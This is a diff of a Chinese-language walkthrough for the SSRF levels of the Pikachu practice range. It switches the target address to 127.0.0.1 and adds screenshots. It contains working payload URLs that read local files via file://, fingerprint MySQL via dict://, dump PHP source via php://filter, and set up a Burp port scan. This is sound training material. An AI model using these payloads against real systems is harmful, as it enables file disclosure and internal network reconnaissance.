@@ -58,7 +58,7 @@ if(isset($_GET['file'])){
 
 ## 手工利用完整流程
 
-以下假设靶场部署在 `192.168.59.1`（也可替换为 `127.0.0.1`），路径为 `/pikachu/vul/ssrf/`。
+以下假设靶场部署在本机 `127.0.0.1`（如果靶场在另一台机器上，把下文所有 `127.0.0.1` 换成那台机器的 IP），路径为 `/pikachu/vul/ssrf/`。
 
 ### 关卡 1（curl）：从正常请求到内网探测
 
@@ -68,17 +68,19 @@ if(isset($_GET['file'])){
 
 
 ```php
-http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php
+http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php
 ```
 
 页面中存在一个可点击链接，点击后 URL 变为：
 
 
 ```php
-http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
+http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
 ```
 
 **目的**：确认 `url` 参数完全可控，且服务端会将 `http://127.0.0.1/...` 的响应内容回显到页面。若正常回显，说明 SSRF 入口成立。
+
+![服务端代为请求 127.0.0.1 并把响应回显出来](../images/ssrf-01-local-fetch.png)
 
 #### 步骤 2：file 协议读取服务器本地文件
 
@@ -86,7 +88,7 @@ http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/
 
 
 ```php
-http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///C:/Windows/win.ini
+http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///C:/Windows/win.ini
 ```
 
 Linux 靶场可使用：
@@ -98,16 +100,20 @@ Linux 靶场可使用：
 
 **目的**：验证 `file://` 协议未被禁用，证明攻击者可以读取服务器本地任意可读文件。`curl` 对 `file://` 的读取能力是该关卡最直接的危害体现。
 
+![file:///C:/Windows/win.ini 的内容被直接回显](../images/ssrf-02-file-winini.png)
+
 #### 步骤 3：dict 协议探测内网端口与服务指纹
 
 探测本机 MySQL 端口：
 
 
 ```php
-http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306
+http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306
 ```
 
 若 3306 开放，响应中可能返回类似 `5.7.26` 的版本信息；若端口关闭，通常表现为连接失败或超时。**目的**：利用 `dict://` 获取端口开放状态与服务指纹，完成内网服务发现。
+
+![dict://127.0.0.1:3306 返回 MySQL 握手包，端口与版本都暴露了](../images/ssrf-03-dict-mysql.png)
 
 #### 步骤 4：http 协议访问内网其他应用
 
@@ -131,7 +137,7 @@ http://192.168.59.1/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306
 
 
 ```php
-http://192.168.59.1/pikachu/vul/ssrf/ssrf_fgc.php?file=info2.php
+http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=info2.php
 ```
 
 #### 步骤 1：php://filter 读取 PHP 源码（Base64 编码）
@@ -140,7 +146,7 @@ http://192.168.59.1/pikachu/vul/ssrf/ssrf_fgc.php?file=info2.php
 
 
 ```php
-http://192.168.59.1/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf_fgc.php
+http://127.0.0.1/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf_fgc.php
 ```
 
 将响应中得到的 Base64 字符串复制，在本地解码，即可获得 `ssrf_fgc.php` 的完整源码。
@@ -176,7 +182,7 @@ http://192.168.59.1/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert
 
 ```php
 GET /pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:§80§/ HTTP/1.1
-Host: 192.168.59.1
+Host: 127.0.0.1
 ```
 
 4. **Payloads** 选项卡：
